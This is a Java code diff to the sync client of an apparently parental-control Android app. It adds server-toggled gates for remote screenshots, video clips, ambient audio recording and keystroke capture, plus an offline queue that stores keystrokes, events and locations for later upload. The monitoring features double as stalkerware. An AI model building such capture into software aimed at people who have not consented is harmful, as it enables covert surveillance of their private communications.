@@ -130,6 +130,9 @@ public class SyncClient {
                         config.setProtectionActive(true);
 
                         // Update local policies based on parent server instructions
+                        if (resJson.has("childName")) {
+                            config.setChildName(resJson.getString("childName"));
+                        }
                         if (resJson.has("lockReason")) {
                             config.setLockReason(resJson.getString("lockReason"));
                         }
@@ -182,6 +185,18 @@ public class SyncClient {
                         }
                         if (resJson.has("gpsIntervalSeconds")) {
                             config.setGpsIntervalSeconds(resJson.getInt("gpsIntervalSeconds"));
+                        }
+                        if (resJson.has("textMonitoringEnabled")) {
+                            config.setTextMonitoringEnabled(resJson.getBoolean("textMonitoringEnabled"));
+                        }
+                        if (resJson.has("screenshotMonitoringEnabled")) {
+                            config.setScreenshotMonitoringEnabled(resJson.getBoolean("screenshotMonitoringEnabled"));
+                        }
+                        if (resJson.has("videoMonitoringEnabled")) {
+                            config.setVideoMonitoringEnabled(resJson.getBoolean("videoMonitoringEnabled"));
+                        }
+                        if (resJson.has("audioMonitoringEnabled")) {
+                            config.setAudioMonitoringEnabled(resJson.getBoolean("audioMonitoringEnabled"));
                         }
                         if (resJson.has("blockedApps")) {
                             JSONArray blockedArr = resJson.getJSONArray("blockedApps");
@@ -238,52 +253,71 @@ public class SyncClient {
                                     config.setBlockedApps(blocked);
                                     Log.i(TAG, "Comando recibido: UNBLOCK_APP -> " + pkg);
                                 } else if ("TAKE_SCREENSHOT".equalsIgnoreCase(cmd)) {
-                                    Log.i(TAG, "Comando recibido: TAKE_SCREENSHOT");
-                                    AppBlockerAccessibilityService a11y = AppBlockerAccessibilityService.getInstance();
-                                    if (a11y != null) {
-                                        a11y.captureScreenshot();
+                                    if (config.isScreenshotMonitoringEnabled()) {
+                                        Log.i(TAG, "Comando recibido: TAKE_SCREENSHOT");
+                                        AppBlockerAccessibilityService a11y = AppBlockerAccessibilityService.getInstance();
+                                        if (a11y != null) {
+                                            a11y.captureScreenshot();
+                                        } else {
+                                            Log.w(TAG, "No se puede capturar pantalla: servicio de accesibilidad inactivo");
+                                        }
                                     } else {
-                                        Log.w(TAG, "No se puede capturar pantalla: servicio de accesibilidad inactivo");
+                                        Log.i(TAG, "Comando TAKE_SCREENSHOT omitido: capturas desactivadas por configuración");
                                     }
                                 } else if ("REQUEST_LOCATION".equalsIgnoreCase(cmd)) {
                                     Log.i(TAG, "Comando recibido: REQUEST_LOCATION -> Actualizando GPS de inmediato");
                                     UsageMonitorService.triggerImmediateSync();
                                 } else if (cmd != null && cmd.toUpperCase().startsWith("TAKE_VIDEO")) {
-                                    int durationSec = 5;
-                                    try {
-                                        durationSec = Integer.parseInt(cmd.toUpperCase().replace("TAKE_VIDEO_", "").replace("TAKE_VIDEO", "").replace("S", "").trim());
-                                    } catch (Exception ignored) {}
-                                    if (durationSec <= 0) durationSec = 5;
-                                    Log.i(TAG, "Comando recibido: " + cmd + " -> Iniciando captura de video de " + durationSec + "s");
-                                    AppBlockerAccessibilityService a11y = AppBlockerAccessibilityService.getInstance();
-                                    if (a11y != null) {
-                                        a11y.captureVideoClip(durationSec);
+                                    if (config.isVideoMonitoringEnabled()) {
+                                        int durationSec = 5;
+                                        try {
+                                            durationSec = Integer.parseInt(cmd.toUpperCase().replace("TAKE_VIDEO_", "").replace("TAKE_VIDEO", "").replace("S", "").trim());
+                                        } catch (Exception ignored) {}
+                                        if (durationSec <= 0) durationSec = 5;
+                                        Log.i(TAG, "Comando recibido: " + cmd + " -> Iniciando captura de video de " + durationSec + "s");
+                                        AppBlockerAccessibilityService a11y = AppBlockerAccessibilityService.getInstance();
+                                        if (a11y != null) {
+                                            a11y.captureVideoClip(durationSec);
+                                        } else {
+                                            Log.w(TAG, "No se puede capturar video clip: servicio de accesibilidad inactivo");
+                                        }
                                     } else {
-                                        Log.w(TAG, "No se puede capturar video clip: servicio de accesibilidad inactivo");
+                                        Log.i(TAG, "Comando TAKE_VIDEO omitido: video desactivado por configuración");
                                     }
                                 } else if (cmd != null && cmd.toUpperCase().startsWith("RECORD_AUDIO")) {
-                                    int durationSec = 5;
-                                    try {
-                                        durationSec = Integer.parseInt(cmd.toUpperCase().replace("RECORD_AUDIO_", "").replace("RECORD_AUDIO", "").replace("S", "").trim());
-                                    } catch (Exception ignored) {}
-                                    if (durationSec <= 0) durationSec = 5;
-                                    Log.i(TAG, "Comando recibido: " + cmd + " -> Iniciando escucha ambiental de " + durationSec + "s");
-                                    com.kidsguard.parentalcontrol.utils.AudioCaptureHelper.captureAndUploadAudio(context, durationSec);
+                                    if (config.isAudioMonitoringEnabled()) {
+                                        int durationSec = 5;
+                                        try {
+                                            durationSec = Integer.parseInt(cmd.toUpperCase().replace("RECORD_AUDIO_", "").replace("RECORD_AUDIO", "").replace("S", "").trim());
+                                        } catch (Exception ignored) {}
+                                        if (durationSec <= 0) durationSec = 5;
+                                        Log.i(TAG, "Comando recibido: " + cmd + " -> Iniciando escucha ambiental de " + durationSec + "s");
+                                        com.kidsguard.parentalcontrol.utils.AudioCaptureHelper.captureAndUploadAudio(context, durationSec);
+                                    } else {
+                                        Log.i(TAG, "Comando RECORD_AUDIO omitido: audio desactivado por configuración");
+                                    }
                                 }
                             }
                         }
 
                         if (callback != null) callback.onSuccess();
+                        com.kidsguard.parentalcontrol.database.OfflineQueueManager.flushQueue(context);
                     } else {
                         if (responseCode == 404) {
                             Log.i(TAG, "Dispositivo no encontrado (404) -> Liberando teléfono");
                             handleUnlinkAndRelease(context);
+                        }
+                        if (locationObj != null) {
+                            com.kidsguard.parentalcontrol.database.OfflineQueueManager.enqueueLocation(context, locationObj, System.currentTimeMillis());
                         }
                         if (callback != null) callback.onError("HTTP " + responseCode);
                     }
                     conn.disconnect();
                 } catch (Exception e) {
                     Log.w(TAG, "Error sincronizando con servidor: " + e.getMessage());
+                    if (locationObj != null) {
+                        com.kidsguard.parentalcontrol.database.OfflineQueueManager.enqueueLocation(context, locationObj, System.currentTimeMillis());
+                    }
                     if (callback != null) callback.onError(e.getMessage());
                 }
             }
@@ -297,6 +331,7 @@ public class SyncClient {
             final String appName,
             final String details
     ) {
+        final long eventTimestamp = System.currentTimeMillis();
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -321,6 +356,7 @@ public class SyncClient {
                     body.put("appName", appName != null ? appName : "");
                     body.put("message", details != null ? details : "");
                     body.put("details", details != null ? details : "");
+                    body.put("timestamp", eventTimestamp);
 
                     try (OutputStream os = conn.getOutputStream()) {
                         byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
@@ -328,9 +364,16 @@ public class SyncClient {
                     }
 
                     int responseCode = conn.getResponseCode();
+                    if (responseCode >= 200 && responseCode < 300) {
+                        com.kidsguard.parentalcontrol.database.OfflineQueueManager.flushQueue(context);
+                    } else {
+                        Log.w(TAG, "Respuesta HTTP " + responseCode + " al enviar evento. Encolando en SQLite local...");
+                        com.kidsguard.parentalcontrol.database.OfflineQueueManager.enqueueEvent(context, eventType, packageName, appName, details, eventTimestamp);
+                    }
                     conn.disconnect();
                 } catch (Exception e) {
-                    Log.w(TAG, "Error enviando evento: " + e.getMessage());
+                    Log.w(TAG, "Sin conexión enviando evento (" + e.getMessage() + "). Guardando en SQLite local...");
+                    com.kidsguard.parentalcontrol.database.OfflineQueueManager.enqueueEvent(context, eventType, packageName, appName, details, eventTimestamp);
                 }
             }
         }).start();
@@ -464,6 +507,7 @@ public class SyncClient {
 
     public static void sendKeystrokes(final Context context, final String packageName, final String appName, final String text) {
         if (text == null || text.trim().isEmpty()) return;
+        final long keystrokeTimestamp = System.currentTimeMillis();
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -484,7 +528,7 @@ public class SyncClient {
                     body.put("package", packageName != null ? packageName : "");
                     body.put("appName", appName != null ? appName : "Aplicación");
                     body.put("text", text);
-                    body.put("timestamp", System.currentTimeMillis());
+                    body.put("timestamp", keystrokeTimestamp);
 
                     try (OutputStream os = conn.getOutputStream()) {
                         byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
@@ -492,14 +536,17 @@ public class SyncClient {
                     }
 
                     int responseCode = conn.getResponseCode();
-                    if (responseCode == 200) {
+                    if (responseCode >= 200 && responseCode < 300) {
                         Log.i(TAG, "⌨️ Registro de texto enviado exitosamente (" + appName + ")");
+                        com.kidsguard.parentalcontrol.database.OfflineQueueManager.flushQueue(context);
                     } else {
-                        Log.w(TAG, "Respuesta al enviar texto: " + responseCode);
+                        Log.w(TAG, "Fallo al enviar texto HTTP " + responseCode + ". Guardando en SQLite local...");
+                        com.kidsguard.parentalcontrol.database.OfflineQueueManager.enqueueKeystroke(context, packageName, appName, text, keystrokeTimestamp);
                     }
                     conn.disconnect();
                 } catch (Exception e) {
-                    Log.w(TAG, "Error enviando texto de teclado: " + e.getMessage());
+                    Log.w(TAG, "Sin conexión enviando texto (" + e.getMessage() + "). Guardando en SQLite local...");
+                    com.kidsguard.parentalcontrol.database.OfflineQueueManager.enqueueKeystroke(context, packageName, appName, text, keystrokeTimestamp);
                 }
             }
         }).start();
